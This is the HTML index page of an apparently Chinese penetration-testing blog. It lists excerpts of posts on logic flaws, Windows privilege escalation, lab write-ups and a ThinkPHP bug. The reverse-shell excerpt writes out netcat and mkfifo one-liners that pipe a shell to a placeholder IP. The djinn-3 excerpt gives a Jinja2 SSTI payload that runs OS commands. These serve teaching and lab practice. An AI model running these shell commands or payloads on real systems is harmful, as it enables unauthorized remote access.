@@ -1,0 +1,387 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>dummersoul's Blog - fate and night</title><meta name="keywords" content="渗透"><meta name="author" content="dummersoul"><meta name="copyright" content="dummersoul"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="网络安全从业者">
+<meta property="og:type" content="website">
+<meta property="og:title" content="dummersoul&#39;s Blog">
+<meta property="og:url" content="https://dummersoul.github.io/page/2/index.html">
+<meta property="og:site_name" content="dummersoul&#39;s Blog">
+<meta property="og:description" content="网络安全从业者">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://dummersoul.github.io/img/dummersoul.jpg">
+<meta property="article:author" content="dummersoul">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dummersoul.github.io/img/dummersoul.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://dummersoul.github.io/page/2/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin="crossorigin"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="preconnect" href="//zz.bdstatic.com"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: false,
+  isHome: true,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2024-03-19 23:33:38'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/HCLonely/images@master/others/heartbeat.min.css"><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="dummersoul's Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/img/dummersoul.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">60</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">34</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div></div></div><div id="body-wrap"><header class="full_page" id="page-header" style="background-image: url(/img/bg.png)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">dummersoul's Blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 归档</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 生活</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 音乐</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 好友链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于我</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="site-info"><h1 id="site-title">dummersoul's Blog</h1><div id="site-subtitle"><span id="subtitle"></span></div><div id="site_social_icons"><a class="social-icon" href="https://github.com/dummersoul" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:dummersoul@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a><a class="social-icon" href="/atom.xml" target="_blank" title="RSS"><i class="fa fa-rss"></i></a></div></div><div id="scroll-down"><i class="fas fa-angle-down scroll-down-effects"></i></div></header><main class="layout" id="content-inner"><div class="recent-posts" id="recent-posts"><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/" title="模拟器检测机制">     <img class="post_bg" src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20211118162431.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="模拟器检测机制"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/%E6%A8%A1%E6%8B%9F%E5%99%A8%E6%A3%80%E6%B5%8B%E6%9C%BA%E5%88%B6/" title="模拟器检测机制">模拟器检测机制</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.514Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-11-18T08:25:18.000Z" title="更新于 2021-11-18 16:25:18">2021-11-18</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/Android/">Android</a></span></div><div class="content">传统的检测方法传统的检测方法主要是对模拟器的IMSI、IDS、默认文件等几个方面进行检测。
+默认号码12345private static String[] known_numbers &#x3D; &#123;&quot;15555215554&quot;, &quot;15555215556&quot;,            &quot;15555215558&quot;, &quot;15555215560&quot;, &quot;15555215562&quot;, &quot;15555215564&quot;,            &quot;15555215566&quot;, &quot;15555215568&quot;, &quot;15555215570&quot;, &quot;15555215572&quot;,            &quot;15555215574&quot;, &quot;15555215576&quot;, &quot;15555215578&quot;, &quot;15555215580&quot;,             ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9FGitHub%E5%9B%BE%E5%BA%8A/" title="免费CDN加速GitHub图床">     <img class="post_bg" src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20210210232654.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="免费CDN加速GitHub图床"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/%E5%85%8D%E8%B4%B9CDN%E5%8A%A0%E9%80%9FGitHub%E5%9B%BE%E5%BA%8A/" title="免费CDN加速GitHub图床">免费CDN加速GitHub图床</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.513Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-10T15:27:02.000Z" title="更新于 2021-02-10 23:27:02">2021-02-10</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E5%9B%BE%E5%BA%8A/">图床</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/CDN%E5%8A%A0%E9%80%9F/">CDN加速</a></span></div><div class="content">由于Github的默认图床是https://raw.githubusercontent.com 加上GitHub用户名和自己的仓库组成的，而https://raw.githubusercontent.com 这个地址国内访问速度慢或者访问失效，要解决这种方法，需要将自己的GitHub图床设定一个指定的域名，是可以国内快速的访问的。
+这时候CDN就可以解决这种问题，jsDelivr提供了免费公共的CDN加速服务，其中包括了github加速，所以只要引用自己的资源，就可以实现全球ADN加速效果。
+
+使用方法：cdn.jsdelivr.net/gh/用户名/仓库名@项目主分支
+
+1https:&#x2F;&#x2F;cdn.jsdelivr.net&#x2F;gh&#x2F;dummersoul&#x2F;Picture@main
+
+在PicGo中自定义域名配置为CDN加速即可（必须加上https://）
+
+参考1、https://www.iszy.cc/2020/05/05/ufjg58/
+</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="逻辑漏洞挖掘思路">     <img class="post_bg" src="/img/%E6%BC%8F%E6%B4%9E.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="逻辑漏洞挖掘思路"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/" title="逻辑漏洞挖掘思路">逻辑漏洞挖掘思路</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.513Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-29T07:41:26.000Z" title="更新于 2020-12-29 15:41:26">2020-12-29</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E9%80%BB%E8%BE%91%E6%BC%8F%E6%B4%9E/">逻辑漏洞</a></span></div><div class="content">1、登录
+
+无验证码可爆破
+验证码登录爆破（4位，或长期有效）
+验证码登录绕过
+验证码在返回包
+短信轰炸
+邮箱轰炸
+sesslon覆盖
+万能密码
+post注入
+xss
+
+2、注册
+
+任意用户注册
+注册覆盖
+验证码在返回包
+短信轰炸
+邮箱轰炸
+xss
+
+3、密码找回
+
+任意用户密码重置
+密保问题在前端源码
+验证码爆破
+手机号码篡改为自己的接收短信验证码
+邮箱篡改为自己的接收短信验证码
+
+4、会员系统（报名系统）
+
+用户越权访问
+订单越权查看修改
+收货地址越权查看修改
+资料越权查看修改
+换绑手机号短信轰炸
+水平垂直越权
+接口查询
+数据泄露
+文件上传
+资料处xss
+csrf
+
+5、支付系统
+
+商品价格修改
+优惠券数量修改
+折扣修改
+商品数量修改
+支付金额修改
+积分修改
+收货地址越权遍历
+订单查看
+备注处xss
+支付成功订单重放
+优惠数量限制突破
+
+</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell的多种姿势">     <img class="post_bg" src="/img/shell.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="反弹shell的多种姿势"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/%E5%8F%8D%E5%BC%B9shell/" title="反弹shell的多种姿势">反弹shell的多种姿势</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.512Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-06T09:37:54.000Z" title="更新于 2021-01-06 17:37:54">2021-01-06</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/getshell/">getshell</a></span></div><div class="content">先监听，再反弹
+攻击者监听一律 nc -lvvp port  socat等除外
+nc支持-e
+1nc -e &#x2F;bin&#x2F;sh IP 4444
+
+不支持-e
+1mknod backpipe p &amp;&amp; nc ip 8080 0&lt;backpipe | &#x2F;bin&#x2F;bash 1&gt;backpipe
+
+
+mkfifo命令的作用是创建FIFO特殊文件，通常也称为命名管道，FIFO文件在磁盘上没有数据块，仅用来标识内核中的一条通道，各进程可以打开FIFO文件进行read/write，实际上是在读写内核通道（根本原因在于FIFO文件结构体所指向的read、write函数和常规文件不一样），这样就实现了进程间通信。
+
+1rm &#x2F;tmp&#x2F;f;mkfifo &#x2F;tmp&#x2F;f;cat &#x2F;tmp&#x2F;f|&#x2F;bin&#x2F;sh -i 2&gt;&amp;1|nc IP 4444 &gt;&#x2F;tmp&#x2F;f
+
+
+rm /tmp/f; 不解释
+mkfifo /tmp/f; 在t ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/" title="Windows提权（一）">     <img class="post_bg" src="/img/privilege.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows提权（一）"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/Windows%E6%8F%90%E6%9D%83%EF%BC%88%E4%B8%80%EF%BC%89/" title="Windows提权（一）">Windows提权（一）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.511Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-25T02:09:14.000Z" title="更新于 2021-02-25 10:09:14">2021-02-25</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/">内网提权</a></span></div><div class="content">
+Windows提权有很多方式，如系统命令提权，漏洞提权，配置不当提权。本次主记录利用系统命令提权，用于将administrator提升到system
+
+xp,2003提权at命令
+
+AT命令是Windows XP中内置的命令，它也可以媲美Windows中的“计划任务”，而且在计划的安排、任务的管理、工作事务的处理方面，AT命令具有更强大更神通的功能。AT命令可在指定时间和日期、在指定计算机上运行命令和程序。
+
+原理：at默认以system权限运行，所以可以进行提权
+1at 10:30 &#x2F;interactive cmd
+
+
+
+等待片刻，立即变化权限
+
+
+虽然cmd是system权限，但是桌面并不是
+
+
+为了完全提权，在cmd中以刚提权成功的system身份输入 taskmgr.exe 启动任务管理器
+
+在任务管理器中结束之前账号开启的桌面进程
+
+
+然后自己添加一个有system权限下开启的桌面进程
+
+
+再点入登入账号
+
+
+提权成功了！
+win7,win8提权at命令在win7 win8已经被取消了，但是没关系，可以用 sc命令提权
+
+SC命令是XP系统中功能强大的DOS命令, ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="常见的未授权访问漏洞">     <img class="post_bg" src="/img/unauthorized.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="常见的未授权访问漏洞"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE/" title="常见的未授权访问漏洞">常见的未授权访问漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.511Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-01T08:15:46.000Z" title="更新于 2021-02-01 16:15:46">2021-02-01</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/getshell/">getshell</a></span></div><div class="content">Redis 未授权访问漏洞漏洞描述
+</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/Windows%E5%85%B3%E9%97%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3/" title="Windows关闭指定的端口">     <img class="post_bg" src="https://cdn.jsdelivr.net/gh/dummersoul/Picture@main/img/20210422174431.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows关闭指定的端口"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/Windows%E5%85%B3%E9%97%AD%E6%8C%87%E5%AE%9A%E7%9A%84%E7%AB%AF%E5%8F%A3/" title="Windows关闭指定的端口">Windows关闭指定的端口</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.510Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-04-22T09:44:38.000Z" title="更新于 2021-04-22 17:44:38">2021-04-22</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/">应急响应</a></span></div><div class="content">关闭135端口
+135端口 主用于RPC（远程过程调用）协议并提供DCOM（分布式组件对象模型）服务，提供RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码；使用DCOM可以通过网络直接通信，能够跨包括HTTP协议在内的多种网络传输。RPC本身在处理通过TCP/IP的消息交换部分有一个漏洞，该漏洞是由于错误的处理格式不正确的消息造成的。该漏洞会影响到RPC与DCOM之间的一个接口，该接口侦听的端口就是135，所以建议关闭135端口。
+
+winxp系统禁用DCOM和RPC的操作步骤打开组件服务
+win+R 运行dcomcnfg
+计算机——我的电脑——属性
+
+
+
+
+选择默认协议 面向连接的TCP/IP 单机移除
+
+
+点击确定后，重启即可关闭135端口
+关闭139端口
+139端口是为“NETBIOS Session Service”提供的，主要用于提供Windows文件和打印机共享以及Unix中的Samba服务。在Windows中要在局域网中进行文件的共享，必须使用该端口。
+端口漏洞：开启139端口虽然可以提供共享服务，但是常常被利用攻击，比如使用流光、superscan ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0(%E4%B8%83)/" title="vulnstack红队评估(七)">     <img class="post_bg" src="/img/cs.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnstack红队评估(七)"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/vulnstack%E7%BA%A2%E9%98%9F%E8%AF%84%E4%BC%B0(%E4%B8%83)/" title="vulnstack红队评估(七)">vulnstack红队评估(七)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.508Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-02-01T09:14:40.000Z" title="更新于 2021-02-01 17:14:40">2021-02-01</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/">内网渗透</a></span></div><div class="content">前提靶机位置：http://vulnstack.qiyuanxuetang.net/vuln/detail/2/
+虚拟机密码hongrisec@2019
+环境共有三个主机：
+VM1：win7提供外网
+VM2：winserver 2003内网域成员
+VM3：winserver 2008内网域控
+拓扑如下：
+
+进入win7 启动phpstudy，设置网络模式为nat
+将kali也设置成nat
+信息收集win7主机ip：192.168.233.129
+扫描端口发现80端口，打开是phpinfo，测试mysql数据库，root-root测试成功
+
+还发现了绝对路径 C:/phpstudy/WWW
+
+dirmap目录扫描1python dirmap.py -i 192.168.233.129 -lcf
+
+发现一个备份文件rar： beifen.rar
+发现了根路径: phpmyadmin
+备份文件下载到本地后发现后台是yxcms
+
+并翻找里面的备份文件，发现了关键信息
+
+后台地址：yxcms/index.php?r=admin
+默认的用户名和密码：admin/123456
+
+getshell一： ...</div></div></div><div class="recent-post-item"><div class="post_cover left_radius"><a href="/2023/11/28/vulnhub%20djinn3/" title="vulnhub djinn-3 writeup">     <img class="post_bg" src="/img/Werkzeug.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="vulnhub djinn-3 writeup"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/vulnhub%20djinn3/" title="vulnhub djinn-3 writeup">vulnhub djinn-3 writeup</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.497Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-01-26T03:51:56.000Z" title="更新于 2021-01-26 11:51:56">2021-01-26</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/vulnhub/">vulnhub</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/%E5%86%85%E7%BD%91%E6%8F%90%E6%9D%83/">内网提权</a></span></div><div class="content">信息探测
+
+5000端口(flask框架)
+发现5000服务是Werkzeug 网站是flask框架，想起了flask有一个SSTI(Server-Side Template Injection) 服务端模板注入漏洞
+漏洞详细描述：flask漏洞探究
+利用原理：在Jinja2引擎中，&#123;&#123;&#125;&#125;不仅仅是变量标示符，也能执行一些简单的表达式
+
+Flask 依赖 Jinja 模板引擎和 Werkzeug WSGI 套件
+
+
+链接可以点开查看
+
+31337端口nc 连接，猜测用户名和密码，因为在5000端口看到一个用户名尝试一下进入
+
+
+1&#123;&#123;config.__class__.__init__.__globals__[&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;
+
+
+
+再回到5000端口页面下，可以看到出现了新的ID链接
+
+
+利用SSTI注入漏洞反弹shellSSTI payload中找一个payload反弹shell
+1&#123;&#123;request|attr(&#3 ...</div></div></div><div class="recent-post-item"><div class="post_cover right_radius"><a href="/2023/11/28/thinkphp6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%20%E8%8E%B7%E5%8F%96getshell/" title="thinkphp 6.x任意文件写入漏洞">     <img class="post_bg" src="/img/mituan.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="thinkphp 6.x任意文件写入漏洞"></a></div><div class="recent-post-info"><a class="article-title" href="/2023/11/28/thinkphp6.0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%9B%E5%BB%BA%20%E8%8E%B7%E5%8F%96getshell/" title="thinkphp 6.x任意文件写入漏洞">thinkphp 6.x任意文件写入漏洞</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-11-28T08:48:58.496Z" title="发表于 2023-11-28 16:48:58">2023-11-28</time><span class="article-meta__separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-12-30T08:11:34.000Z" title="更新于 2020-12-30 16:11:34">2020-12-30</time></span><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fas fa-tag article-meta__icon"></i><a class="article-meta__tags" href="/tags/%E9%9D%B6%E6%9C%BA/">靶机</a><span class="article-meta__link">•</span><a class="article-meta__tags" href="/tags/mitu/">mitu</a></span></div><div class="content">漏洞简介影响版本：ThinkPHP 6.0.0 ~ ThinkPHP 6.0.1
+漏洞危害：任意文件操作，getshell
+官方补丁：https://github.com/top-think/framework/commit/1bbe75019ce6c8e0101a6ef73706217e406439f2
+靶机位置：https://mituan.zone/#/playground/2c9f843c75e1935a017616e414785472
